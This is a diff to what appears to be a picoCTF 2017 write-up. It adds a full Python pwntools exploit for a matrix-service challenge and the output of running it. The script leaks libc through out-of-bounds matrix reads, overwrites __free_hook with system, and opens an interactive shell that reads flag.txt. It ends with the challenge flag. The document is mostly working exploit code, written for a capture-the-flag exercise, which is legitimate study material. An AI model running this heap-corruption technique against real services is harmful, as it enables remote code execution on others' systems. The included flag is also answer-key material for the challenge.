@@ -44,11 +44,180 @@ In order for exploit to work every time we need to free all the matrices BEFORE 
 
 **Final exploit**
 ```python
+#!/usr/bin/env python2
 
+from pwn import *
+
+from struct import pack,unpack
+
+import sys
+
+SETBUF_GOT = 0x0804AFC8
+
+SSCANF_GOT = 0x0804AFF0
+
+SETBUF_OFFSET = 0x6b350
+
+SYSTEM_OFFSET = 0x3e3e0
+
+FREE_HOOK_OFFSET = 0x1aa8b8
+
+MATRICES_ARRAY = 0x0804B080
+
+PRINTF_OFFSET = 0x4cc70
+
+def offsetToXY(offset):
+
+index = offset/4
+
+x = index/10000
+
+y = index%10000
+
+if x>10000:
+
+print("Mission failed, can't get index for address %x"%offset)
+
+sys.exit(1)
+
+return x,y
+
+r = remote("shell2017.picoctf.com",42470)
+
+r.recvuntil("Enter command: ")
+
+r.send("create 6 6\n")#we'll destroy it later, so free(m->data) aka system will be called
+
+r.recvuntil("Enter command: ")
+
+r.send("set 0 0 0 %.9g \n"%(unpack("<f","sh\x00\x00")[0]))
+
+r.recvuntil("Enter command: ")
+
+r.send("create 15 15\n")#we'll set __free_hook with it
+
+r.recvuntil("Enter command: ")
+
+for i in range(2,512):
+
+r.send("create 10000 10000\n")
+
+r.recvuntil("Enter command: ")
+
+x,y = offsetToXY(SETBUF_GOT)
+
+r.send("get %d %d %d\n"%(i,x,y))
+
+res = r.recvuntil("Enter command:").splitlines()[-2].strip()
+
+if "Matrix[%d][%d] = 0"%(x,y) not in res:
+
+setbuf_libc = struct.unpack("<I",struct.pack("<f",float(res[21:])))[0]
+
+break
+
+for j in range(2,i):
+
+r.send("destroy %d\n"%j)
+
+r.recvuntil("Enter command: ")
+
+libc_base = setbuf_libc-SETBUF_OFFSET
+
+system_libc = libc_base+SYSTEM_OFFSET
+
+free_hook_libc = libc_base+FREE_HOOK_OFFSET
+
+matrix_pointer_address = MATRICES_ARRAY+1*4
+
+print("system address %x"%system_libc)
+
+print("libc base %x"%libc_base)
+
+print("free_hook address %x"%free_hook_libc)
+
+x,y = offsetToXY(matrix_pointer_address)
+
+r.send("get %d %d %d\n"%(i,x,y))
+
+res = r.recvuntil("Enter command:").splitlines()[-2].strip()
+
+matrix_address = struct.unpack("<I",struct.pack("<f",float(res[21:])))[0]
+
+matrix_data_address = matrix_address+8
+
+x,y = offsetToXY(matrix_data_address)
+
+r.send("get %d %d %d\n"%(i,x,y))
+
+res = r.recvuntil("Enter command:").splitlines()[-2].strip()
+
+data_ptr = struct.unpack("<I",struct.pack("<f",float(res[21:])))[0]
+
+print("Old matrix[1]->data %x"%data_ptr)
+
+r.send("set %d %d %d %.9g\n"%(i,x,y,unpack("<f",pack("<I",free_hook_libc))[0]))
+
+r.recvuntil("Enter command: ")
+
+r.send("get %d %d %d\n"%(i,x,y))
+
+res = r.recvuntil("Enter command:").splitlines()[-2].strip()
+
+data_ptr = struct.unpack("<I",struct.pack("<f",float(res[21:])))[0]
+
+print("New matrix[1]->data %x"%data_ptr)
+
+r.send("get 1 0 0\n")
+
+res = r.recvuntil("Enter command:").splitlines()[-2].strip()
+
+data_ptr = struct.unpack("<I",struct.pack("<f",float(res[15:])))[0]
+
+print("Old hook %x"%data_ptr)
+
+r.send("set 1 0 0 %.9g\n"%(unpack("<f",pack("<I",system_libc))[0]))
+
+r.recvuntil("Enter command: ")
+
+r.send("get 1 0 0\n")
+
+res = r.recvuntil("Enter command:").splitlines()[-2].strip()
+
+data_ptr = struct.unpack("<I",struct.pack("<f",float(res[15:])))[0]
+
+print("New hook %x"%data_ptr)
+
+r.send("destroy 0\n")
+
+r.interactive()
 ```
-The flag is  `6271e0c26371220cc1c7166fda9f7d72`.
+On running this code we get,
+```text
+$ python solve.py 
+[*] Checking for new versions of pwntools
+    To disable this functionality, set the contents of /home/ec2-user/.pwntools-cache/update to 'never'.
+[*] You have the latest version of Pwntools (3.12.2)
+[+] Opening connection to shell2017.picoctf.com on port 42470: Done
+system address f757f3e0
+libc base f7541000
+free_hook address f76eb8b8
+Old matrix[1]->data 99500c0
+New matrix[1]->data f76eb8b8
+Old hook 0
+New hook f757f3e0
+[*] Switching to interactive mode
+ $ ls
+flag.txt
+matrix
+xinetd_wrapper.sh
+$ cat flag.txt
+517c97c471a525694c14c5adb8a3eebe
+```
+
+The flag is  `517c97c471a525694c14c5adb8a3eebe`.
 
 
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTEwNzAwMzY3OTZdfQ==
+eyJoaXN0b3J5IjpbLTE3ODA5Njc2NTFdfQ==
 -->
